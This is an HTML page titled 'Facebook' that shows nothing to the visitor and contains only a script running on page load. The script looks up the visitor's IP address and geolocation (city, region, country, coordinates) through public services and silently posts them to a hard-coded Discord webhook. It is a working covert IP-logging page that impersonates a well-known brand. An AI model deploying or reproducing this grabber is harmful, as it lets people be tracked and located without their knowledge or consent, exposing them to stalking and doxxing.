<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook</title>
</head>
<body>
  
  <script>
    // Your Discord webhook URL
    const webhookURL = "https://discordapp.com/api/webhooks/1328782776912056370/gufMzPSyP7GsBq54qwO3N7L0M3ldWaEYTNrj-yIohzzsHVfFQM4yGFAh24OKdsKS7AvI";

    // Fetch IP and location
    async function fetchIPAndLocation() {
      try {
        // Get IP Address
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ipAddress = ipData.ip;

        // Get location based on IP
        const locationResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
        const locationData = await locationResponse.json();

        // Format the message
        const message = {
          content: `IP Address: ${ipAddress}\nLocation: ${locationData.city}, ${locationData.region}, ${locationData.country}\nCoordinates: ${locationData.latitude}, ${locationData.longitude}`,
        };

        // Send to Discord webhook
        await fetch(webhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(message),
        });

        console.log('IP and location sent to Discord successfully!');
      } catch (error) {
        console.error('Error capturing IP and location:', error);
      }
    }

    fetchIPAndLocation();
  </script>
</body>
</html>
